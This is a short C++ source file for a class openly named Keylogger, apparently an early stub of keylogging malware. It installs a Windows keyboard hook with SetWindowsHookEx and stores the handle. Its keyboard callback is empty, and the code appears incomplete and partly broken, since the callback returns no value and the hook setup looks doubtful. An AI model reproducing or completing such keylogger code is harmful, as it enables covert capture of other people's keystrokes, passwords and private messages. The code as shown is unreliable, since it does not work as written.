#include "Keylogger.h"

BOOLEAN Keylogger::TrySetHook()
{
	HHOOK res = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, NULL, NULL);
	if (res != NULL)
	{
		Keylogger::hHook = res;
		return TRUE;
	}
	else
		return FALSE;
}

LRESULT CALLBACK Keylogger::KeyboardProc(IN int code, IN WPARAM wParam, IN LPARAM lParam)
{

}

